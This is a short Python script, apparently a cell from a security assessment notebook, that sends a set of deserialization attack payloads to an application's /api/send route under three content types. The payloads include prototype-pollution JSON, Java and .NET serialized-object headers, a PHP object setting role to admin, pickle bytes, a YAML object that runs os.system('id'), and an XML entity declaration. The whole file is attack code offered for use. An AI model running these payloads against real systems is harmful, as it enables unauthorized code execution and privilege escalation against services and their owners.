import sys, json, time
sys.path.insert(0, "/work/p12")
from paced import req, show

# ---- Cell: deserialization on the real app surfaces -----------------------
# 1) serialized-payload bodies to /api/send (the only non-static route)
PAYLOADS = {
  "json_node": b'{"__proto__":{"polluted":1},"constructor":{"prototype":{"polluted":1}},"a":1}',
  "json_reviver": b'{"$regex":"^a","__proto__":1}',
  "java_aced": bytes([0xAC,0xED,0x00,0x05,0x73,0x72,0x00,0x11]) + b"http://x",
  "java_b64": b"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
  "php_obj": b'O:8:"stdClass":1:{s:4:"role";s:5:"admin";}',
  "py_pickle": bytes([0x80,0x04,0x95,0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00]),
  "yaml": b'!!python/object/apply:os.system ["id"]\n',
  "net_bf": b'\x01\x00\x00\x00\xfe\xff\xff\xffBinaryFormatter',
  "jsonxml_dtd": b'<!DOCTYPE r [<!ENTITY x "x">]><r>&x;</r>',
}
for name, p in PAYLOADS.items():
    for ct in ["application/json", "application/xml", "application/x-www-form-urlencoded"]:
        r = req("/api/send", "POST", p, ctype=ct)
        show(f"deser/{name}/{ct}", r, 120)
    time.sleep(1.2)
